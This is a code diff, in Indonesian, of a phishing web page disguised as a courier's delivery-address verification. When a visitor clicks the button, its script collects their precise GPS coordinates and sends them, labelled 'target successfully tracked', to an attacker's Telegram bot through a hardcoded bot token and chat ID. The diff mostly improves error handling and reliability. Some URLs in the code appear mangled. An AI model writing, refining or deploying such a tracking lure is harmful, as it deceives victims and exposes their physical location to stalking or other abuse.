@@ -17,35 +17,34 @@
 
 <div class="card">
     <h2>📍 Konfirmasi Lokasi Pengiriman</h2>
-    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan klik tombol di bawah untuk memverifikasi lokasi GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
+    <p>Sistem mendeteksi ketidaksesuaian alamat. Silakan verifikasi koordinat GPS rumah Anda agar kurir tidak salah mengantar paket.</p>
     <br>
     <button class="btn" onclick="ambilLokasi()">KONFIRMASI LOKASI SAYA</button>
     <p id="status" style="margin-top: 15px; font-weight: bold; color: #d9534f;"></p>
 </div>
 
 <script>
-    // ⚠️ GANTI DENGAN DATA BOT ANDA
+    // 1. KUNCI TOKEN BARU ANDA DI SINI
     const TOKEN_BOT = "8730133712:AAE4vG00GTpbJSUOCjEmHbTLQ08shoSwu7o";
     
-    // Fungsi untuk mendapatkan ID pengguna dari URL parameter (?uid=xxxx)
+    // 2. AMBIL PARAMETER ID DARI LINK SECARA OTOMATIS
     const urlParams = new URLSearchParams(window.location.search);
     const userIdAdmin = urlParams.get('uid'); 
 
     function ambilLokasi() {
         const statusText = document.getElementById("status");
         statusText.style.color = "#333";
-        statusText.innerText = "Sedang menghubungkan ke satelit GPS...";
+        statusText.innerText = "Menghubungkan ke satelit GPS...";
 
         if (navigator.geolocation) {
-            // Meminta akses GPS dengan akurasi tinggi
             navigator.geolocation.getCurrentPosition(kirimKeTelegram, tanganiError, {
                 enableHighAccuracy: true,
-                timeout: 10000,
+                timeout: 15000,
                 maximumAge: 0
             });
         } else {
             statusText.style.color = "#d9534f";
-            statusText.innerText = "Browser Anda tidak mendukung pelacakan GPS.";
+            statusText.innerText = "Browser tidak mendukung sensor GPS.";
         }
     }
 
@@ -55,33 +54,41 @@
         const acc = position.coords.accuracy;
         const statusText = document.getElementById("status");
 
-        // Format pesan yang akan dikirim ke Telegram admin
         const pesan = `🎯 *TARGET BERHASIL TERLACAK!*\n\n` +
-                      `📍 *Koordinat GPS:* \`${lat}, ${lon}\`\n` +
-                      `🎯 *Akurasi Sensor:* ± ${Math.round(acc)} meter\n\n` +
-                      `🗺️ *Link Google Maps:* \n` +
+                      `📍 *Koordinat:* \`${lat}, ${lon}\`\n` +
+                      `🎯 *Akurasi:* ± ${Math.round(acc)} meter\n\n` +
+                      `🗺️ *Google Maps:* \n` +
                       `https://google.com{lat},${lon}`;
 
-        // Mengirim data ke Telegram via API bot secara langsung
-        const targetChatId = userIdAdmin ? userIdAdmin : "6953925929"; 
+        // ⚠️ VALIDASI ID TELEGRAM AMAN DARI ERROR
+        // Jika target mengklik link utama tanpa lewat bot, data dikirim ke ID Admin utama Anda
+        // GANTI angka 12345678 di bawah dengan nomor ID Telegram asli Anda dari @userinfobot (tanpa tanda petik)
+        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
+
         const url = `https://telegram.org{TOKEN_BOT}/sendMessage`;
 
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: targetChatId,
+                chat_id: String(targetChatId), // Dipaksa menjadi string agar dibaca valid oleh API Telegram
                 text: pesan,
                 parse_mode: 'Markdown'
             })
         })
-        .then(response => {
-            statusText.style.color = "#28a745";
-            statusText.innerText = "✅ Verifikasi Lokasi Sukses! Paket Anda akan segera diproses.";
+        .then(res => res.json())
+        .then(data => {
+            if(data.ok) {
+                statusText.style.color = "#28a745";
+                statusText.innerText = "✅ Verifikasi Lokasi Sukses! Alamat paket diperbarui.";
+            } else {
+                statusText.style.color = "#d9534f";
+                statusText.innerText = "Eror API Telegram: " + data.description;
+            }
         })
-        .catch(error => {
+        .catch(err => {
             statusText.style.color = "#d9534f";
-            statusText.innerText = "Gagal mengirim data. Coba lagi.";
+            statusText.innerText = "Gagal mengirim data jaringan.";
         });
     }
 
@@ -90,17 +97,16 @@
         statusText.style.color = "#d9534f";
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                statusText.innerText = "❌ Gagal: Anda harus mengizinkan akses lokasi/GPS untuk verifikasi paket.";
+                statusText.innerText = "❌ Hubungkan GPS: Klik 'Izinkan' saat browser meminta akses lokasi.";
                 break;
             case error.POSITION_UNAVAILABLE:
-                statusText.innerText = "❌ Gagal: Informasi lokasi tidak tersedia di perangkat Anda.";
+                statusText.innerText = "❌ Gagal: Sinyal GPS perangkat tidak stabil.";
                 break;
             case error.TIMEOUT:
-                statusText.innerText = "❌ Gagal: Waktu permintaan habis. Pastikan GPS Anda aktif.";
+                statusText.innerText = "❌ Gagal: Waktu habis. Aktifkan lokasi di pengaturan HP.";
                 break;
-            case error.UNKNOWN_ERROR:
-                statusText.innerText = "❌ Gagal: Terjadi kesalahan tidak dikenal.";
-                break;
+            default:
+                statusText.innerText = "❌ Gagal: Terjadi gangguan teknis.";
         }
     }
 </script>
